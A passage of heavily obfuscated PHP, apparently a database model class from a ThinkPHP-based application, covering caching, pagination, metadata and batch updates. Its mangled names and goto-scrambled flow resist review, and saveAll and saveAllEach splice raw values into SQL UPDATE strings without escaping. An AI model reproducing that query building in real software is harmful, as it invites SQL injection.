_beforeUpdate(&$a§«ˆ†‚„¸, $FìÔè³Ä‹æ) { $bˆÇ£™¼‚ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->checkDataAutoHas($bˆÇ£™¼‚[361])) { return; } $this->dataBeforeFilter($a§«ˆ†‚„¸, $bˆÇ£™¼‚[361]); } protected function _afterSelect(&$EÏ²Ñ¨í¾È, $FÈÍ„ŠîƒŒ) { if (!is_array($EÏ²Ñ¨í¾È)) { return; } if (!$this->checkDataAutoHas($_SERVER[åÌÛ»ô¢‚ö™][362])) { return; } foreach ($EÏ²Ñ¨í¾È as &$Eä‹ÜÍ¹ï) { $this->dataAfterFilter($Eä‹ÜÍ¹ï); } unset($Eä‹ÜÍ¹ï); } protected function _afterFind(&$AáÂ°ÒÏİ—, $c©ÊòåèÄ) { if (!is_array($AáÂ°ÒÏİ—)) { return; } if (!$this->checkDataAutoHas($_SERVER[åÌÛ»ô¢‚ö™][362])) { return; } $this->dataAfterFilter($AáÂ°ÒÏİ—); } public function setAutoIncrement($D‘¹¼³‰³¬) { $F¦áÚáÆÒ¤ = array($this->getPk() => $D‘¹¼³‰³¬); $e¢”çÓòâº = $this->data($F¦áÚáÆÒ¤)->add(); if ($e¢”çÓòâº) { $this->delete($e¢”çÓòâº); } } public function getAutoIncrement() { $D‰…Ò»Ğì = $this->getTableName(); $a“ùÎĞßò = $this->max($this->getPk()); $C…ßâ±µ½í = $this->query("\163\150\x6f\x77\40\164\141\x62\154\x65\40\x73\164\141\164\x75\163\40\167\x68\x65\162\145\40\116\141\x6d\145\75\x27{$D‰…Ò»Ğì}\x27"); $bÇ¬¹¬“™ = $C…ßâ±µ½í[0][$_SERVER[åÌÛ»ô¢‚ö™][363]]; $Eó‚Ü‰¤îŒ = max($a“ùÎĞßò, $bÇ¬¹¬“™); return $Eó‚Ü‰¤îŒ; } protected function _callBefore($EöÚ‰Ğ£‘, $eÒÂ†‡Ôñ«) { return $this->cacheCallCheck($EöÚ‰Ğ£‘, $eÒÂ†‡Ôñ«, !1); } protected function _callAfter($F«±æÎ¯ƒó, $fëªÀöÈ±º) { return $this->cacheCallCheck($F«±æÎ¯ƒó, $fëªÀöÈ±º, !0); } protected function cacheFunctionAlias($fáÙØïñã) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($bë…®«ùÍµ, $bŸ¾ÅÓÏò¥, $Eºëä°¿Å‘ = false) { $a”Òªö»‚È = $this->cacheFunctionAlias($bŸ¾ÅÓÏò¥); if (!$a”Òªö»‚È) { return; } foreach ($a”Òªö»‚È as $Aö¢´Ùêâ => $eàš¦Ã–Ç) { $B‹‚ì–ó´‚ = $eàš¦Ã–Ç[0]; $Bœğ½Ğ¡§ = explode($_SERVER[åÌÛ»ô¢‚ö™][47], $eàš¦Ã–Ç[1]); if ($bë…®«ùÍµ == $Aö¢´Ùêâ) { return $this->cacheFunctionGet($Aö¢´Ùêâ, $B‹‚ì–ó´‚); } if ($Eºëä°¿Å‘ && in_array($bë…®«ùÍµ, $Bœğ½Ğ¡§)) { $this->cacheFunctionClear($Aö¢´Ùêâ, $B‹‚ì–ó´‚); } } } public function cacheFunctionGet($eÏ½¨Ó‹æ, $eİ÷™æã©Ì) { $cáÎ·’æ„ = $this->cacheKeyMake($eÏ½¨Ó‹æ, $eİ÷™æã©Ì); $eÍÀ‡®³®è = Cache::get($cáÎ·’æ„); if (!is_array($eÍÀ‡®³®è)) { $eÍÀ‡®³®è = call_user_func_array(array($this, $eÏ½¨Ó‹æ), array($eİ÷™æã©Ì, !0)); Cache::set($cáÎ·’æ„, $eÍÀ‡®³®è); } return $eÍÀ‡®³®è; } public function cacheFunctionClear($cÖÔ·¨“Í—, $f‰„²¿šùì) { $c¶ËÛ¡í‰ = $f‰„²¿šùì; if (!is_array($f‰„²¿šùì)) { $c¶ËÛ¡í‰ = array($f‰„²¿šùì); } foreach ($c¶ËÛ¡í‰ as $b”›°ïÙàğ) { $b½”¤ŒÚäŸ = $this->cacheKeyMake($cÖÔ·¨“Í—, $b”›°ïÙàğ); Cache::remove($b½”¤ŒÚäŸ); } } private function cacheKeyMake($aªÉµØ‚™Ê, $b‰í¡æÎ´) { $f‘ÜÇËÍó° =& $_SERVER[åÌÛ»ô¢‚ö™]; return get_class($this) . $f‘ÜÇËÍó°[70] . $aªÉµØ‚™Ê . $f‘ÜÇËÍó°[364] . $b‰í¡æÎ´; } protected function selectPage($AæÓÊ‡ëâÑ = 200, $f¯Ü‡‹ˆ¡ = 1) { goto bµœ±ÊÅİ˜; FëÀÉ÷: $AÔÜ·±Ğ¶æ = ceil($cÍ§„‡ÅÓ” / $AæÓÊ‡ëâÑ); $f¯Ü‡‹ˆ¡ = intval(isset($in[$C£¤Ï¾ªÖ[356]]) ? $in[$C£¤Ï¾ªÖ[356]] : $f¯Ü‡‹ˆ¡); $f¯Ü‡‹ˆ¡ = $f¯Ü‡‹ˆ¡ <= 1 ? 1 : ($f¯Ü‡‹ˆ¡ >= $AÔÜ·±Ğ¶æ ? $AÔÜ·±Ğ¶æ : $f¯Ü‡‹ˆ¡); goto AÆŸ­¯‡ˆ; bµœ±ÊÅİ˜: $C£¤Ï¾ªÖ =& $_SERVER[åÌÛ»ô¢‚ö™]; global $in; $cøÑÂ¦¢— = $this->optionsValue(); goto BÕˆÑÇßÚÇ; A“‚ÎÏ»ª‹: $dÄÍˆÎåÒ¦ = $cøÑÂ¦¢—; $dÄÍˆÎåÒ¦[$C£¤Ï¾ªÖ[366]] = array(); $this->optionsValue($dÄÍˆÎåÒ¦); goto bÀ×ë‰‹Ï ; dŠĞŠ ·±™: if ($AÔÜ·±Ğ¶æ == 1) { $cÍ§„‡ÅÓ” = count($bÔãƒ—àà‹); } $FÜ·¦¹øº¿ = array($C£¤Ï¾ªÖ[367] => array($C£¤Ï¾ªÖ[368] => $cÍ§„‡ÅÓ”, $C£¤Ï¾ªÖ[365] => $AæÓÊ‡ëâÑ, $C£¤Ï¾ªÖ[356] => $f¯Ü‡‹ˆ¡, $C£¤Ï¾ªÖ[369] => $AÔÜ·±Ğ¶æ), $C£¤Ï¾ªÖ[370] => $bÔãƒ—àà‹ ? $bÔãƒ—àà‹ : array()); return $FÜ·¦¹øº¿; goto B¦½˜’¹™Š; AÆŸ­¯‡ˆ: $this->optionsValue($cøÑÂ¦¢—); $bÔãƒ—àà‹ = $this->page($f¯Ü‡‹ˆ¡, $AæÓÊ‡ëâÑ)->select(); $bÔãƒ—àà‹ = is_array($bÔãƒ—àà‹) ? $bÔãƒ—àà‹ : array(); goto dŠĞŠ ·±™; bÀ×ë‰‹Ï : $cÍ§„‡ÅÓ” = intval($this->count()); $AæÓÊ‡ëâÑ = intval($AæÓÊ‡ëâÑ); $AæÓÊ‡ëâÑ = $AæÓÊ‡ëâÑ <= 5 ? 5 : ($AæÓÊ‡ëâÑ >= $dğôƒ¬«Üç ? $dğôƒ¬«Üç : $AæÓÊ‡ëâÑ); goto FëÀÉ÷; BÕˆÑÇßÚÇ: $dğôƒ¬«Üç = 4000; $AæÓÊ‡ëâÑ = isset($in[$C£¤Ï¾ªÖ[365]]) ? $in[$C£¤Ï¾ªÖ[365]] : $AæÓÊ‡ëâÑ; if ($AæÓÊ‡ëâÑ === -1) { unset($in[$C£¤Ï¾ªÖ[365]]); $dğôƒ¬«Üç = 100000000; $AæÓÊ‡ëâÑ = $dğôƒ¬«Üç; } goto A“‚ÎÏ»ª‹; B¦½˜’¹™Š: } protected function checkLength($AŞ—¼Ì™„, $Bö‡öªš³ó = 0, $fŸê¸õ§ = '') { $f‘‡¨Øİ« =& $_SERVER[åÌÛ»ô¢‚ö™]; $Bö‡öªš³ó = $Bö‡öªš³ó ? $Bö‡öªš³ó : 65536; if (!$AŞ—¼Ì™„ || strlen($AŞ—¼Ì™„) < $Bö‡öªš³ó) { return; } $fŸê¸õ§ = $fŸê¸õ§ ? $fŸê¸õ§ . $f‘‡¨Øİ«[67] : $f‘‡¨Øİ«[33]; show_json($fŸê¸õ§ . LNG($f‘‡¨Øİ«[371]) . "\50{$Bö‡öªš³ó}\51", !1); } protected function metaSet($CÕˆÓõä·, $B¨„Ì¸³ö£ = null, $Cñ·›Ú—‡ = null) { goto CˆŒªùáƒ›; fÒŞŒ£í†Ë: if (is_null($B¨„Ì¸³ö£)) { return $bÔì•¢ò->where(array($F™ºÌ®°Œ² => $CÕˆÓõä·))->delete(); } if (is_null($Cñ·›Ú—‡) && is_string($B¨„Ì¸³ö£)) { return $bÔì•¢ò->where($bïÒ—‘»ÃĞ)->delete(); } $cèÔŠïĞ¤³ = is_array($B¨„Ì¸³ö£) ? $B¨„Ì¸³ö£ : array(); goto A×’ÖŠ¯Ü°; CˆŒªùáƒ›: $C¯¸ÎŒ¬… =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->tableMeta) { return !1; } $F™ºÌ®°Œ² = $this->tableMeta[$C¯¸ÎŒ¬…[372]]; goto aêÀ›êÆ­í; A×’ÖŠ¯Ü°: if (is_string($B¨„Ì¸³ö£)) { $cèÔŠïĞ¤³[$B¨„Ì¸³ö£] = $Cñ·›Ú—‡; } $eñÎÓË¸Öñ = array(); foreach ($cèÔŠïĞ¤³ as $DëŞª½Û¨„ => $AÆã¼÷²†›) { $this->checkLength($AÆã¼÷²†›, !1, $dŠ§‰ÃËĞ . $C¯¸ÎŒ¬…[4] . $DëŞª½Û¨„); $eñÎÓË¸Öñ[] = array($F™ºÌ®°Œ² => $CÕˆÓõä·, $C¯¸ÎŒ¬…[89] => $DëŞª½Û¨„, $C¯¸ÎŒ¬…[375] => $AÆã¼÷²†›); } goto fôŒ·‚‡¬è; fôŒ·‚‡¬è: $bÔì•¢ò->where(array($F™ºÌ®°Œ² => $CÕˆÓõä·))->addAll($eñÎÓË¸Öñ, array(), !0); return !0; goto a¹«Ù±Š–; aêÀ›êÆ­í: $dŠ§‰ÃËĞ = $this->tableMeta[$C¯¸ÎŒ¬…[373]]; $bÔì•¢ò = Model($dŠ§‰ÃËĞ); $bïÒ—‘»ÃĞ = array($F™ºÌ®°Œ² => $CÕˆÓõä·, $C¯¸ÎŒ¬…[374] => $B¨„Ì¸³ö£); goto fÒŞŒ£í†Ë; a¹«Ù±Š–: } public function metaGet($aŒœä¸Š’Û, $cŞ¼øŒƒ„‹ = false) { goto C£¸ »°†¤; C£¸ »°†¤: $CîÎ»øÁğÀ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->tableMeta) { return array(); } $A‘¤º­Ê»İ = $this->tableMeta[$CîÎ»øÁğÀ[372]]; goto AÊŒ…¥¢¼Ë; Aô»¬ì…: $bÈĞ‚ë®¿ = $f©×•’‡Ô->field($CîÎ»øÁğÀ[376])->where($aö¿ùÈ¬»Ş)->select(); $bÈĞ‚ë®¿ = array_to_keyvalue($bÈĞ‚ë®¿, $CîÎ»øÁğÀ[89], $CîÎ»øÁğÀ[375]); return $bÈĞ‚ë®¿; goto fï†å„ ‹ã; AÊŒ…¥¢¼Ë: $f©×•’‡Ô = Model($this->tableMeta[$CîÎ»øÁğÀ[373]]); if ($cŞ¼øŒƒ„‹) { $aö¿ùÈ¬»Ş = array($A‘¤º­Ê»İ => $aŒœä¸Š’Û, $CîÎ»øÁğÀ[89] => $cŞ¼øŒƒ„‹); return $f©×•’‡Ô->where($aö¿ùÈ¬»Ş)->getField($CîÎ»øÁğÀ[375]); } $aö¿ùÈ¬»Ş = array($A‘¤º­Ê»İ => $aŒœä¸Š’Û); goto Aô»¬ì…; fï†å„ ‹ã: } private function checkDataAutoHas($D©Ê©ÁÔ·°) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $E“—‘­Äª„) { if (in_array($D©Ê©ÁÔ·°, explode($_SERVER[åÌÛ»ô¢‚ö™][47], $E“—‘­Äª„[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$A•Ë·£êŠœ, $e¢­öŒÀõ) { $BãÚ‘Öª®ä =& $_SERVER[åÌÛ»ô¢‚ö™]; foreach ($this->dataAuto as $b™‘Áï‹®) { $f‘›‚ãÅ˜ = $b™‘Áï‹®[0]; if (!in_array($e¢­öŒÀõ, explode($BãÚ‘Öª®ä[47], $b™‘Áï‹®[2]))) { continue; } switch (trim($b™‘Áï‹®[3])) { case $BãÚ‘Öª®ä[324]: case $BãÚ‘Öª®ä[325]: $AŞºÀòº  = $b™‘Áï‹®[1]; $e­ª²õÖˆ÷ = isset($b™‘Áï‹®[4]) ? (array) $b™‘Áï‹®[4] : array(); if ($AŞºÀòº  == $BãÚ‘Öª®ä[203] && array_key_exists($f‘›‚ãÅ˜, $A•Ë·£êŠœ)) { if (!$A•Ë·£êŠœ[$f‘›‚ãÅ˜]) { unset($A•Ë·£êŠœ[$f‘›‚ãÅ˜]); } break; } if (isset($A•Ë·£êŠœ[$f‘›‚ãÅ˜])) { array_unshift($e­ª²õÖˆ÷, $A•Ë·£êŠœ[$f‘›‚ãÅ˜]); } if ($BãÚ‘Öª®ä[324] == $b™‘Áï‹®[3]) { $A•Ë·£êŠœ[$f‘›‚ãÅ˜] = call_user_func_array($AŞºÀòº , $e­ª²õÖˆ÷); } else { $A•Ë·£êŠœ[$f‘›‚ãÅ˜] = call_user_func_array(array(&$this, $AŞºÀòº ), $e­ª²õÖˆ÷); } break; case $BãÚ‘Öª®ä[276]: $A•Ë·£êŠœ[$f‘›‚ãÅ˜] = $A•Ë·£êŠœ[$b™‘Áï‹®[1]]; break; case $BãÚ‘Öª®ä[297]: if (isset($A•Ë·£êŠœ[$f‘›‚ãÅ˜]) && !is_string($A•Ë·£êŠœ[$f‘›‚ãÅ˜])) { $A•Ë·£êŠœ[$f‘›‚ãÅ˜] = json_encode_force($A•Ë·£êŠœ[$f‘›‚ãÅ˜]); } break; case $BãÚ‘Öª®ä[326]: if ($A•Ë·£êŠœ[$f‘›‚ãÅ˜] === $BãÚ‘Öª®ä[33]) { unset($A•Ë·£êŠœ[$f‘›‚ãÅ˜]); } break; case $BãÚ‘Öª®ä[327]: $A•Ë·£êŠœ[$f‘›‚ãÅ˜] = $b™‘Áï‹®[1]; default: break; } } if ($e¢­öŒÀõ == $BãÚ‘Öª®ä[360]) { $e¦§ôç÷Ì¯ = strtolower($this->db->getDbType()); if (strpos($e¦§ôç÷Ì¯, $BãÚ‘Öª®ä[9]) !== 0) { return; } $Bµ˜ ©„™‚ = $this->field(!0)->fields; $eÃå‚ê‚ŞÅ = $Bµ˜ ©„™‚[$BãÚ‘Öª®ä[255]]; if (isset($Bµ˜ ©„™‚[$BãÚ‘Öª®ä[254]])) { unset($eÃå‚ê‚ŞÅ[$Bµ˜ ©„™‚[$BãÚ‘Öª®ä[254]]]); } foreach ($eÃå‚ê‚ŞÅ as $DÊš‘µ©ĞÓ => $e¢­öŒÀõ) { if (!isset($A•Ë·£êŠœ[$DÊš‘µ©ĞÓ])) { $A•Ë·£êŠœ[$DÊš‘µ©ĞÓ] = $BãÚ‘Öª®ä[33]; } } } } private function dataAfterFilter(&$fÓ¬·»•Ù«) { $bñ Ş–â¶¸ =& $_SERVER[åÌÛ»ô¢‚ö™]; foreach ($this->dataAuto as $C¬æÕÌãøİ) { $c”¤³ÈäŸ‘ = $C¬æÕÌãøİ[0]; if (!in_array($bñ Ş–â¶¸[362], explode($bñ Ş–â¶¸[47], $C¬æÕÌãøİ[2]))) { continue; } if (!isset($fÓ¬·»•Ù«[$c”¤³ÈäŸ‘])) { continue; } switch (trim($C¬æÕÌãøİ[3])) { case $bñ Ş–â¶¸[324]: case $bñ Ş–â¶¸[325]: $c„Í¬éŠ‚‚ = isset($C¬æÕÌãøİ[4]) ? (array) $C¬æÕÌãøİ[4] : array(); array_unshift($c„Í¬éŠ‚‚, $fÓ¬·»•Ù«[$c”¤³ÈäŸ‘]); if ($bñ Ş–â¶¸[324] == $C¬æÕÌãøİ[3]) { $fÓ¬·»•Ù«[$c”¤³ÈäŸ‘] = call_user_func_array($C¬æÕÌãøİ[1], $c„Í¬éŠ‚‚); } else { $fÓ¬·»•Ù«[$c”¤³ÈäŸ‘] = call_user_func_array(array(&$this, $C¬æÕÌãøİ[1]), $c„Í¬éŠ‚‚); } break; case $bñ Ş–â¶¸[276]: $fÓ¬·»•Ù«[$c”¤³ÈäŸ‘] = $fÓ¬·»•Ù«[$C¬æÕÌãøİ[1]]; break; case $bñ Ş–â¶¸[297]: $E¹éÏ¸ßÁğ = $fÓ¬·»•Ù«[$c”¤³ÈäŸ‘]; $fÓ¬·»•Ù«[$c”¤³ÈäŸ‘] = json_decode($E¹éÏ¸ßÁğ, !0); if (is_null($fÓ¬·»•Ù«[$c”¤³ÈäŸ‘])) { $fÓ¬·»•Ù«[$c”¤³ÈäŸ‘] = $E¹éÏ¸ßÁğ; } break; case $bñ Ş–â¶¸[326]: if ($fÓ¬·»•Ù«[$c”¤³ÈäŸ‘] === $bñ Ş–â¶¸[33]) { unset($fÓ¬·»•Ù«[$c”¤³ÈäŸ‘]); } break; case $bñ Ş–â¶¸[327]: $fÓ¬·»•Ù«[$c”¤³ÈäŸ‘] = $C¬æÕÌãøİ[1]; default: break; } } } public function saveAll($cè²‡µÖÙ) { goto e”ùîÜí„¾; bòÚ²âÊ•É: $c×™²›ÛõÊ = array(); $D—îİ–»¡– = count($cè²‡µÖÙ); for ($b–«†“¿† = 0; $b–«†“¿† < $D—îİ–»¡–; $b–«†“¿†++) { $EªÁŸ†¦Á« = $cè²‡µÖÙ[$b–«†“¿†]; if (!is_array($EªÁŸ†¦Á«) || count($EªÁŸ†¦Á«) != 4) { continue; } $EÑ²óìîœ = "\125\x50\104\101\x54\105\x20\140{$fÌ‹°¢“Ê©}\x60\x20\123\x45\124\x20{$EªÁŸ†¦Á«[2]}\x20\75\40\103\101\x53\x45\40{$EªÁŸ†¦Á«[0]}\x20\xa"; if ($eàÛ¶ˆ‡ï… == 0) { $FƒÂÉß¾©Ï = $EÑ²óìîœ; } $c×™²›ÛõÊ[] = $eŸô•çŸ„Û[113] . $EªÁŸ†¦Á«[1] . $eŸô•çŸ„Û[113]; $eàÛ¶ˆ‡ï…++; $FƒÂÉß¾©Ï .= "\x20\127\110\105\x4e\40\47{$EªÁŸ†¦Á«[1]}\47\x20\124\110\105\x4e\40\47{$EªÁŸ†¦Á«[3]}\47\40\12"; if ($eàÛ¶ˆ‡ï… == $Aº¬è–ÜÀ¾ || $b–«†“¿† == $D—îİ–»¡– - 1) { goto f™‡‡ãäİ; eç’òñ ­ˆ: $c×™²›ÛõÊ = array(); goto EíİŞÓ‰«; f™‡‡ãäİ: $E‘ØÅğ¥±™ = implode($eŸô•çŸ„Û[47], $c×™²›ÛõÊ); $FƒÂÉß¾©Ï .= "\x20\105\x4e\x44\40\40\x57\x48\105\x52\x45\40{$EªÁŸ†¦Á«[0]}\40\x49\x4e\40\x28{$E‘ØÅğ¥±™}\x29\x20"; $this->execute($FƒÂÉß¾©Ï); goto e—øÒÔ¾×ª; e—øÒÔ¾×ª: $eàÛ¶ˆ‡ï… = 0; $FƒÂÉß¾©Ï = $EÑ²óìîœ; $this->chunkEventCheck(count($c×™²›ÛõÊ)); goto eç’òñ ­ˆ; EíİŞÓ‰«: } } goto Cø Ê¯îô»; e©¤†–ô‹: $cè²‡µÖÙ = is_array($cè²‡µÖÙ) ? $cè²‡µÖÙ : array(); $FƒÂÉß¾©Ï = $eŸô•çŸ„Û[377]; $eàÛ¶ˆ‡ï… = 0; goto bòÚ²âÊ•É; e”ùîÜí„¾: $eŸô•çŸ„Û =& $_SERVER[åÌÛ»ô¢‚ö™]; $fÌ‹°¢“Ê© = $this->tablePrefix . $this->tableName; $Aº¬è–ÜÀ¾ = self::SQL_WHERE_IN_CHUNK; goto e©¤†–ô‹; Cø Ê¯îô»: $this->chunkEventSet(); goto D¸ÑÉ†”Àî; D¸ÑÉ†”Àî: } public function saveAllEach($fò‹åÈ×„¢) { $eËé‘‘¹Û =& $_SERVER[åÌÛ»ô¢‚ö™]; $cß„ªÌ³«Ú = $this->tablePrefix . $this->tableName; foreach ($fò‹åÈ×„¢ as $eØÔŠì½‚) { if (!is_array($eØÔŠì½‚) || count($eØÔŠì½‚) != 4) { continue; } $aµˆÒ¤›Îå = $eØÔŠì½‚[0] . $eËé‘‘¹Û[378] . $eØÔŠì½‚[1] . $eËé‘‘¹Û[113]; $Añè„ÛŠö = $eØÔŠì½‚[2] . $eËé‘‘¹Û[378] . $eØÔŠì½‚[3] . $eËé‘‘¹Û[113]; $cî˜ĞÒÉ¡¡ = "\x75\x70\x64\141\x74\145\40{$cß„ªÌ³«Ú}\40\163\145\164\40{$Añè„ÛŠö}\x20\x77\150\145\x72\145\x20{$aµˆÒ¤›Îå}\x3b"; $this->execute($cî˜ĞÒÉ¡¡); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($C¾Ÿñ¹İ˜å = false, $bÖÚ¥ì…ñ = false) { $this->_chunkEvent = $C¾Ÿñ¹İ˜å; $this->_chunkEventParam = $bÖÚ¥ì…ñ; } private function chunkEventCheck($Añ¨‚êÕ¯½) { if (!$this->_chunkEvent) { return; } $cÔŠçË³ù = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $cÔŠçË³ù[$_SERVER[åÌÛ»ô¢‚ö™][379]] = $Añ¨‚êÕ¯½; Hook::trigger($this->_chunkEvent, $cÔŠçË³ù); } public function addAll($fÚ¤¸¦Ò‘Ñ, $dŒ‘Ğ¬‚«’ = array(), $A³¾áíÊ™Ê = false) { goto C¢ †À„„; aÏÁùÈŒ´Ü: if (empty($fÚ¤¸¦Ò‘Ñ)) { $this->error = think_lang($DÎ¬ÎÏŸ¤‰[274]); return !1; } $dŒ‘Ğ¬‚«’ = $this->_parseOptions($dŒ‘Ğ¬‚«’); foreach ($fÚ¤¸¦Ò‘Ñ as $FÊó”°³İÁ => $bä»â‰Ÿ³) { $fÚ¤¸¦Ò‘Ñ[$FÊó”°³İÁ] = $this->_facade($bä»â‰Ÿ³); $this->_beforeInsert($fÚ¤¸¦Ò‘Ñ[$FÊó”°³İÁ], $dŒ‘Ğ¬‚«’); } goto aÑ¼šÅî£‹; aÑ¼šÅî£‹: if (method_exists($this->db, $DÎ¬ÎÏŸ¤‰[275])) { for ($f—Â‘í¨‹ = 0; $f—Â‘í¨‹ < count($fÚ¤¸¦Ò‘Ñ); $f—Â‘í¨‹ += $câ—•ŒŠ¬) { $E‚…Êäˆ­† = array_slice($fÚ¤¸¦Ò‘Ñ, $f—Â‘í¨‹, $câ—•ŒŠ¬); if (!is_array($E‚…Êäˆ­†) || count($E‚…Êäˆ­†) == 0) { break; } $eŸÃÃ´è‹ì = $this->db->insertAll($E‚…Êäˆ­†, $dŒ‘Ğ¬‚«’, $A³¾áíÊ™Ê); $this->chunkEventCheck(count($E‚…Êäˆ­†)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($fÚ¤¸¦Ò‘Ñ as $FÊó”°³İÁ => $bä»â‰Ÿ³) { $eŸÃÃ´è‹ì = $this->db->insert($bä»â‰Ÿ³, $dŒ‘Ğ¬‚«’, $A³¾áíÊ™Ê); } $this->commit(); } if (!1 !== $eŸÃÃ´è‹ì) { $F÷Õ×‘…« = $this->getLastInsID(); if ($F÷Õ×‘…«) { return $F÷Õ×‘…«; } } return $eŸÃÃ´è‹ì; goto B¥Û¡£¯Şç; C¢ †À„„: $DÎ¬ÎÏŸ¤‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; ignore_timeout(); $câ—•ŒŠ¬ = self::SQL_WHERE_IN_CHUNK; goto aÏÁùÈŒ´Ü; B¥Û¡£¯Şç: } public function save($a©“½‰ïø– = '', $F…ÈÅÏÊ³¢ = array()) { goto aÇˆè’¤í; aÇˆè’¤í: $fºœ†‹Õöğ =& $_SERVER[åÌÛ»ô¢‚ö™]; $bš¨‘ö¥ÇÇ = self::SQL_WHERE_IN_CHUNK; $AÌİ°ˆÊÎ = $this->optionsValue(); goto B’ñ¨Œ™‡‡; Aö³·¼¯ï: $fÊ¶ÑìÀãÎ = $AÌİ°ˆÊÎ[$fºœ†‹Õöğ[278]][$fæì¦…—ŸÙ][1]; $fÊ¶ÑìÀãÎ = is_array($fÊ¶ÑìÀãÎ) ? $fÊ¶ÑìÀãÎ : array(); $a‚ˆò„†•¢ = count($fÊ¶ÑìÀãÎ); goto D·„Í¹ÛÂ­; D·„Í¹ÛÂ­: for ($A‹ÎÙ”øµÃ = 0; $A‹ÎÙ”øµÃ < $a‚ˆò„†•¢; $A‹ÎÙ”øµÃ += $bš¨‘ö¥ÇÇ) { $D«“ó÷Á = array_slice($fÊ¶ÑìÀãÎ, $A‹ÎÙ”øµÃ, $bš¨‘ö¥ÇÇ); if (!is_array($D«“ó÷Á) || count($D«“ó÷Á) == 0) { break; } $AÌİ°ˆÊÎ[$fºœ†‹Õöğ[278]][$fæì¦…—ŸÙ][1] = $D«“ó÷Á; $this->optionsValue($AÌİ°ˆÊÎ); $Döâ‚Æ ˜¿ += parent::save($a©“½‰ïø–, $F…ÈÅÏÊ³¢); $this->chunkEventCheck(count($D«“ó÷Á)); } $this->chunkEventSet(); return $Döâ‚Æ ˜¿; goto fİí‘Š„ï; B’ñ¨Œ™‡‡: $fæì¦…—ŸÙ = $this->findWhereField($AÌİ°ˆÊÎ); if (!$fæì¦…—ŸÙ) { return parent::save($a©“½‰ïø–, $F…ÈÅÏÊ³¢); } $Döâ‚Æ ˜¿ = 0; goto Aö³·¼¯ï; fİí‘Š„ï: } public function add($fÙîå„”ô = '', $dŸìóŒÀ•™ = array(), $aªÈÍ…¦ÕÒ = false) { if ($this->addTaskStatus && is_array($fÙîå„”ô)) { $this->addTaskData[] = $fÙîå„”ô; return; } return parent::add($fÙîå„”ô, $dŸìóŒÀ•™, $aªÈÍ…¦ÕÒ); } public function parseWhereLike($Bã××Úª›š, $cÉæ³ÅŒ‘× = '', $a±ïĞ®„íÃ = false, &$B«·µÌ¡ë» = false) { goto A…Û…«Ê¿Á; e¸Ô±ŸªµÊ: foreach ($Bã××Úª›š as $A›´ĞÁ => $d±ÀÑ²¯ô«) { if (is_array($d±ÀÑ²¯ô«) && count($d±ÀÑ²¯ô«) == 2 && $d±ÀÑ²¯ô«[0] == $f„õ•ŠÁá¨[382] && is_string($d±ÀÑ²¯ô«[1]) && substr($d±ÀÑ²¯ô«[1], 0, 1) == $f„õ•ŠÁá¨[383] && substr($d±ÀÑ²¯ô«[1], strlen($d±ÀÑ²¯ô«[1]) - 1, 1) == $f„õ•ŠÁá¨[383]) { goto F§ˆß›Ê„ô; F§ˆß›Ê„ô: $B«·µÌ¡ë» = !0; $b¼ÔĞ‡® = is_string($A›´ĞÁ) ? $A›´ĞÁ : $cÉæ³ÅŒ‘×; $cƒáëÕÉµ« = substr($d±ÀÑ²¯ô«[1], 1, strlen($d±ÀÑ²¯ô«[1]) - 2); goto D¤›é¨„÷; D¶ê¡î‘é: $fÖ¦½Ã«–ˆ[$DÕµÒãÒÁà] = $f„õ•ŠÁá¨[386] . $b¼ÔĞ‡® . $f„õ•ŠÁá¨[387] . $cƒáëÕÉµ« . $f„õ•ŠÁá¨[388]; $DÕµÒãÒÁà++; continue; goto E‹¢¶óÔÜƒ; D¤›é¨„÷: $cƒáëÕÉµ« = $this->db->escapeString($cƒáëÕÉµ«); if (!strpos($b¼ÔĞ‡®, $f„õ•ŠÁá¨[91])) { $b¼ÔĞ‡® = $f„õ•ŠÁá¨[384] . $b¼ÔĞ‡® . $f„õ•ŠÁá¨[384]; } if ($fÆÚ¼ÇÓ‚‰[$f„õ•ŠÁá¨[385]]) { $cƒáëÕÉµ« = $f„õ•ŠÁá¨[113] . $cƒáëÕÉµ« . $f„õ•ŠÁá¨[113]; } goto D¶ê¡î‘é; E‹¢¶óÔÜƒ: } if (is_array($d±ÀÑ²¯ô«)) { $cÉæ³ÅŒ‘× = is_string($A›´ĞÁ) ? $A›´ĞÁ : $cÉæ³ÅŒ‘×; $d±ÀÑ²¯ô« = $this->parseWhereLike($d±ÀÑ²¯ô«, $cÉæ³ÅŒ‘×, !0, $B«·µÌ¡ë»); } if (is_numeric($A›´ĞÁ)) { $fÖ¦½Ã«–ˆ[$DÕµÒãÒÁà] = $d±ÀÑ²¯ô«; $DÕµÒãÒÁà++; } else { $fÖ¦½Ã«–ˆ[$A›´ĞÁ] = $d±ÀÑ²¯ô«; } } if ($B«·µÌ¡ë» && !$a±ïĞ®„íÃ) { trace_log(array($fÖ¦½Ã«–ˆ, $Bã××Úª›š), $f„õ•ŠÁá¨[278]); } return $fÖ¦½Ã«–ˆ; goto cè¯‹—ÑÑ; A…Û…«Ê¿Á: $f„õ•ŠÁá¨ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fÆÚ¼ÇÓ‚‰ = $GLOBALS[$f„õ•ŠÁá¨[6]][$f„õ•ŠÁá¨[380]]; if (!$fÆÚ¼ÇÓ‚‰[$f„õ•ŠÁá¨[381]]) { return $Bã××Úª›š; } goto AÀˆì‰›×¼; AÀˆì‰›×¼: if (!is_array($Bã××Úª›š)) { return $Bã××Úª›š; } $fÖ¦½Ã«–ˆ = array(); $DÕµÒãÒÁà = 0; goto e¸Ô±ŸªµÊ; cè¯‹—ÑÑ: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($fâêŞØòø× = array()) { goto A¿¸¯Ë»Š; f·ˆğŠİ: return $eô‘©‰†; goto CùÄƒ¦İÛÇ; A¿¸¯Ë»Š: 